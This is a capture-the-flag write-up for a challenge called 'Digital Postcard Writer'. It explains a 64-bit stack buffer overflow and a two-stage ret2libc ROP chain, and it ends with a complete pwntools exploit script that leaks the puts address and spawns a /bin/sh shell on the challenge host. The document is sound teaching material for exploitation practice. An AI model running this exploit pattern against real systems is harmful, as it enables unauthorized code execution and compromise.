## Digital Postcard Writer - BOF and 2-stage ret2libc

The target application, presented as the Digital Postcard Writer, serves as an instructional paradigm for executing a Return to Standard Library attack within a modern Linux environment. The provided source code and compilation configurations deliberately introduce specific weaknesses while maintaining certain system level protections, necessitating a structured, multi stage exploitation methodology.

### Source Code Vulnerability and Memory Layout

The fundamental flaw resides within the `vuln` function, where the application allocates a local character array spanning one hundred and twenty eight bytes to store the user's message. The vulnerability materializes when the program subsequently invokes the `read` system call, instructing the kernel to accept up to five hundred and twelve bytes from the standard input directly into this restricted buffer. This dramatic disparity between the allocated space and the permitted input length creates a classical stack based buffer overflow.

By continuing to write beyond the intended boundaries, the `read` function systematically overwrites adjacent memory structures moving toward higher addresses. In a sixty four bit architecture, the memory directly following the local buffer contains the eight byte saved base pointer, which is followed immediately by the eight byte saved return address. Consequently, the analyst must supply exactly one hundred and thirty six bytes of arbitrary padding to reach and overwrite the instruction pointer, thereby seizing control of the execution flow.

### Architectural Constraints and Provided Gadgets

An analysis of the included compilation directives reveals the explicit use of the `-fno-stack-protector` and `-no-pie` flags. These parameters intentionally disable the stack canary, ensuring the overflow progresses without triggering an immediate abort, and disable Position Independent Executable protections, forcing the application's instruction text to load at predictable, static memory addresses.

Furthermore, the source code features a bespoke function named `pop_rdi_ret`, annotated with the `naked` compiler attribute. This directive strips the standard function prologue and epilogue, compiling the code into a pure sequence of `pop rdi` followed by a `ret` instruction. This explicitly engineered gadget grants the analyst immediate control over the **RDI** register, which is mandated by the System V Application Binary Interface as the destination for the first argument of any subsequent function call.

### Environmental Execution Context

The operational environment is defined by the provided containerization instructions, which specify the `ubuntu:24.04` base image as the execution foundation. The container configuration establishes a restricted user and exposes the application over a network socket utilizing the `socat` utility. Crucially, the container does not explicitly import a standalone C standard library file, indicating that the application relies dynamically on the native library shipped with the specified Ubuntu release. To accurately calculate memory offsets for the exploit, the security researcher must extract the corresponding version of the standard library from an identical container environment to utilize during script development.

### Two Stage Exploitation Strategy

Because Address Space Layout Randomization is active at the kernel level, the base address of the standard library changes with every execution, rendering the location of critical functions unpredictable. The exploitation script employs a two stage Return Oriented Programming chain to circumvent this randomization.

The initial payload leverages the calculated offset to overwrite the return address with the provided `pop rdi` gadget. The script injects the static address of the Global Offset Table entry for the `puts` function into the stack, which is subsequently popped into the **RDI** register. Execution is then directed to the Procedure Linkage Table stub of `puts`, compelling the application to output the dynamically resolved runtime address of the function. To sustain execution, the chain concludes by returning to the static address of the `main` function, effectively restarting the application state.

Upon receiving the leaked address over the network stream, the exploitation script subtracts the known static offset of `puts` to resolve the randomized base address of the loaded library. With the memory space successfully mapped, the script dynamically locates the `system` function and the `/bin/sh` string. The subsequent execution of the vulnerable function permits the delivery of the second payload. This terminal chain loads the `/bin/sh` pointer into the argument register and calls `system`. A critical addition to this final chain is an extra `ret` gadget, which serves to advance the stack pointer by eight bytes, ensuring the strict sixteen byte stack alignment required by the advanced vector instructions utilized within the `system` function call.



```Python
#!/usr/bin/env python3  
from pwn import *  
  
exe = ELF('./ret2libc_home', checksec=False)  
libc = ELF('./libc.so.6', checksec=False)  
context.binary = exe  
  
def conn():  
    if args.LOCAL:  
        return process(exe.path)  
    return remote('offsec.m0lecon.it', 13523)  
  
r = conn()  
  
OFFSET_TO_RIP = 136  
POP_RDI = exe.symbols['pop_rdi_ret']  
  
rop = ROP(exe)  
RET = rop.find_gadget(['ret'])[0]  
  
r.recvuntil(b"message:\n")  
  
stage1 = flat(  
    b"A" * OFFSET_TO_RIP,  
    p64(POP_RDI),  
    p64(exe.got['puts']),  
    p64(exe.plt['puts']),  
    p64(exe.symbols['main'])  
)  
  
r.send(stage1)  
r.recvuntil(b"sent!\n")  
  
leak = r.recvline().strip()  
puts_leak = u64(leak.ljust(8, b"\x00"))  
libc.address = puts_leak - libc.symbols['puts']  
  
log.success(f"Leaked puts address: {hex(puts_leak)}")  
log.success(f"Resolved Libc Base: {hex(libc.address)}")  
  
r.recvuntil(b"message:\n")  
  
binsh = next(libc.search(b"/bin/sh\x00"))  
system = libc.symbols['system']  
  
stage2 = flat(  
    b"A" * OFFSET_TO_RIP,  
    p64(RET),  
    p64(POP_RDI),  
    p64(binsh),  
    p64(system)  
)  
  
r.send(stage2)  
r.interactive()
```